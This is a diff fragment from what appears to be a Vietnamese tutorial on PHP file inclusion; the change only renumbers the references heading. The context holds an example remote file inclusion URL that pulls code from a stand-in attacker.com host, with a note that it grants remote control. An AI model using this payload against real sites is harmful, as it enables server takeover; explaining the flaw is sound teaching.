@@ -139,7 +139,7 @@ http://example.com/index.php?page=http://attacker.com/exec
 ```
 Khi người dùng truy cập thì lập tức mã độc trên sẽ được `include` thẳng vào code trên hệ thống vào gây là lỗi từ đó họ có thể chiếm quyền kiểm soát từ xa.
 
-## . Tham khảo
+## 4. Tham khảo
 https://securitydaily.net/tan-cong-file-inclusion/
 
 https://www.immuniweb.com/vulnerability/php-file-inclusion.html
